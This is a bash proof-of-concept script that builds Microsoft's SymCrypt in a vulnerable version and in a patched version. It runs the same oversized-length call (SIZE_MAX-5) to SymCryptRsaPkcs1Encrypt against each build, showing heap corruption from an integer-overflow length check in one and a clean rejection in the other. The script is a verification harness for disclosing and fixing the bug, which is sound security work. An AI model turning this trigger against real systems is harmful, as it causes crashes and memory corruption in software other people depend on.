#!/bin/bash
# SymcryOverrun — real-code PoC against microsoft/SymCrypt (HEAD 286762b)
#
# Builds SymCrypt twice (vulnerable HEAD, and a patched copy with the
# bf421d1-style overflow-safe guard), then runs the SAME attacker call
# against both. Vulnerable: heap corruption/segfault. Fixed: clean
# INVALID_ARGUMENT.
#
# Requires (all preinstalled under /home/millie/tools/toolchain on this host):
#   - zig 0.14 (zig cc)  -> /home/millie/tools/toolchain/zig-linux-x86_64-0.14.0
#   - cmake              -> /home/millie/tools/toolchain/cmake-3.29.3-linux-x86_64
# If those are missing, install a C compiler and adapt the paths below.
set -u
HERE="$(cd "$(dirname "$0")" && pwd)"
ZIG=/home/millie/tools/toolchain/zig-linux-x86_64-0.14.0/zig
CMAKE=/home/millie/tools/toolchain/cmake-3.29.3-linux-x86_64/bin/cmake
SYMCRYPT=/tmp/opencode/audit/SymCrypt
BUILD=/tmp/opencode/symcryoverrun-build

if [ ! -x "$ZIG" ] || [ ! -x "$CMAKE" ]; then
  echo "toolchain missing: need zig + cmake at $ZIG / $CMAKE"
  echo "falling back to the arithmetic model (exploit.py)"
  python3 "$HERE/exploit.py"
  exit 0
fi

mkdir -p /tmp/opencode
[ -d "$SYMCRYPT" ] || git clone --quiet https://github.com/microsoft/SymCrypt "$SYMCRYPT"

# zig wrappers (cmake cannot invoke 'zig cc' directly)
cat > /tmp/opencode/zigcc.sh  << EOF
#!/bin/bash
exec $ZIG cc "\$@"
EOF
cat > /tmp/opencode/zigcxx.sh << EOF
#!/bin/bash
exec $ZIG c++ "\$@"
EOF
cat > /tmp/opencode/zigar.sh  << EOF
#!/bin/bash
exec $ZIG ar "\$@"
EOF
cat > /tmp/opencode/zigranlib.sh << EOF
#!/bin/bash
exec $ZIG ar s "\$@"
EOF
chmod +x /tmp/opencode/zig*.sh

build_lib() {  # $1 = build dir ; source tree must already be in the right state
  rm -rf "$1"
  "$CMAKE" -S "$SYMCRYPT" -B "$1" \
    -DSYMCRYPT_USE_ASM=OFF -DSYMCRYPT_UNIT_TESTS=OFF -DSYMCRYPT_BUILD_MODULES=OFF \
    -DCMAKE_BUILD_TYPE=Release \
    -DCMAKE_C_COMPILER=/tmp/opencode/zigcc.sh \
    -DCMAKE_CXX_COMPILER=/tmp/opencode/zigcxx.sh \
    -DCMAKE_AR=/tmp/opencode/zigar.sh \
    -DCMAKE_RANLIB=/tmp/opencode/zigranlib.sh > /dev/null 2>&1
  "$CMAKE" --build "$1" -j 6 > /dev/null 2>&1 || { echo "build $1 failed"; exit 1; }
}

cd "$SYMCRYPT" || exit 1
git checkout --quiet -- lib/rsa_padding.c
build_lib "$BUILD-vuln"

# apply the bf421d1-style overflow-safe guard (see README: Fix)
sed -i 's/if( cbPkcs1Format < (cbPlaintext + 11) )/if( cbPkcs1Format < 11 || cbPlaintext > cbPkcs1Format - 11 )/' \
       "$SYMCRYPT/lib/rsa_padding.c"
sed -i 's/if(  cbOaepFormat < (cbPlaintext + (cbHash \* 2) + 2) ||/if(  cbOaepFormat < (cbHash * 2 + 2) || cbPlaintext > cbOaepFormat - ((cbHash * 2) + 2) ||/' \
       "$SYMCRYPT/lib/rsa_padding.c"
build_lib "$BUILD-fixed"
git checkout --quiet -- lib/rsa_padding.c

CC=/tmp/opencode/zigcc.sh
INC=-I"$SYMCRYPT/inc"
FIXED_LIBS="$BUILD-fixed/lib/libsymcrypt_common.a $BUILD-fixed/lib/libsymcrypt_mlkem.a $BUILD-fixed/lib/libsymcrypt_generic.a"
VULN_LIBS="$BUILD-vuln/lib/libsymcrypt_common.a $BUILD-vuln/lib/libsymcrypt_mlkem.a $BUILD-vuln/lib/libsymcrypt_generic.a"

$CC -O1 -DSYMCRYPT_IGNORE_PLATFORM $INC "$HERE/rsa_crash.c" $VULN_LIBS -latomic -o "$HERE/rsa_crash_vuln" || exit 1
$CC -O1 -DSYMCRYPT_IGNORE_PLATFORM $INC "$HERE/rsa_crash.c" $FIXED_LIBS -latomic -o "$HERE/rsa_crash_fixed" || exit 1

echo
echo "=== VULNERABLE SymCrypt (HEAD 286762b) — SymCryptRsaPkcs1Encrypt(cbSrc=SIZE_MAX-5)"
timeout 60 "$HERE/rsa_crash_vuln" || echo ">>> VULNERABLE BUILD CRASHED (rc=$?) — heap corruption from the wrapped length guard"
echo
echo "=== FIXED SymCrypt (overflow-safe guard) — same call"
timeout 60 "$HERE/rsa_crash_fixed" && echo ">>> FIXED BUILD REJECTED the input with INVALID_ARGUMENT (0x800e)"
